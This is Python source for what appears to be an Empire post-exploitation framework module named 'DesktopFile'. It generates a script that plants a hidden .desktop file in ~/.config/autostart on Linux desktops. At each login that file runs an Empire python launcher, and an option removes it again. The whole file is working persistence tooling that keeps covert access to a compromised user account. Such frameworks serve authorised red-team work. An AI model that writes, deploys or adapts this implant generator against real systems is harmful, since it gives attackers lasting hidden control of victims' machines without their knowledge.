import base64
class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'DesktopFile',
            'Author': '@jarrodcoulter',
            'Description': 'Installs an Empire launcher script in ~/.config/autostart on Linux versions with GUI.',
            'Background' : False,
            'OutputExtension' : None,
            'NeedsAdmin' : False,
            'OpsecSafe' : False,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': 'https://digitasecurity.com/blog/2018/01/23/crossrat/, https://specifications.freedesktop.org/desktop-entry-spec/latest/ar01s07.html, https://neverbenever.wordpress.com/2015/02/11/how-to-autostart-a-program-in-raspberry-pi-or-linux/'
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Remove' : {
                'Description'   :   'Remove Persistence based on FileName. True/False',
                'Required'      :   False,
                'Value'         :   ''
            },
            'FileName' : {
                'Description'   :   'File name without extension that you would like created in ~/.config/autostart/ folder.',
                'Required'      :   False,
                'Value'         :   'sec_start'
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        remove = self.options['Remove']['Value']
        fileName = self.options['FileName']['Value']
        listenerName = self.options['Listener']['Value']
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python')
        launcher = launcher.strip('echo').strip(' | /usr/bin/python &')
        dtSettings = """
[Desktop Entry]
Name=%s
Exec=python -c %s
Type=Application
NoDisplay=True
""" % (fileName, launcher)
        script = """
import subprocess
import sys
import os
remove = "%s"
dtFile = \"\"\"
%s
\"\"\"
home = os.path.expanduser("~")
filePath = home + "/.config/autostart/"
writeFile = filePath + "%s.desktop"
if remove.lower() == "true":
    if os.path.isfile(writeFile):
        os.remove(writeFile)
        print "\\n[+] Persistence has been removed"
    else:
        print "\\n[-] Persistence file does not exist, nothing removed"
else:
    if not os.path.exists(filePath):
        os.makedirs(filePath)
    e = open(writeFile,'wb')
    e.write(dtFile)
    e.close()
    print "\\n[+] Persistence has been installed: ~/.config/autostart/%s"
    print "\\n[+] Empire daemon has been written to %s"
""" % (remove, dtSettings, fileName, fileName, fileName)
        return script